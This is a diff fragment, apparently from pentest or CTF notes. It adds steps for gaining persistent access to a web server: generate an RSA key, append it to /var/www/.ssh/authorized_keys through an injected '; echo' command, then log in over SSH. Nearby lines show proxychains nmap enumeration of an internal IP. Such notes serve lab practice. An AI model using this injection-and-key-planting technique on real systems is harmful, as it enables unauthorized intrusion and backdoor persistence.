@@ -103,10 +103,13 @@ proxychains nmap --script=http-enum.nse 192.168.28.100
   </BODY></HTML>
 ```
 
-
-
-
-
+#  upload copy of ssh rsa token
+```
+ssh-keygen  -t rsa -b 4096
+cat rsa key
+; echo "<rsa key>" >> /var/www/.ssh/authorized_keys
+ssh into web server
+```
 
 
 
